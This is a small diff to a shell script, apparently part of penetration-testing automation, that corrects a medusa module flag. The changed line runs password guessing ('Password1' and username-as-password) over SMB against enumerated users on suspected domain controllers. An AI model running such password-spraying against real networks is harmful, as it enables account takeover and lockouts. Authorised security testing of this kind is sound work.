@@ -156,7 +156,7 @@ fi
 #	TODO: Figure out better way to identify possible DC's 
 #	TODO: Attempt to automate finding account lockout threshold and implimenting as a var.
 	echo "[*] Guessing user-as-pass and Password1 for enumerated users against possible DC's"
-	medusa -m SMBNT -H ./ports/dns.txt -U ./enum4linux/identified-users.txt -p Password1 -e s -O UAP-Password1-medusa.txt
+	medusa -M smbnt -H ./ports/dns.txt -U ./enum4linux/identified-users.txt -p Password1 -e s -O UAP-Password1-medusa.txt
 	echo "[*] Password guessing complete"
 	echo ""
 
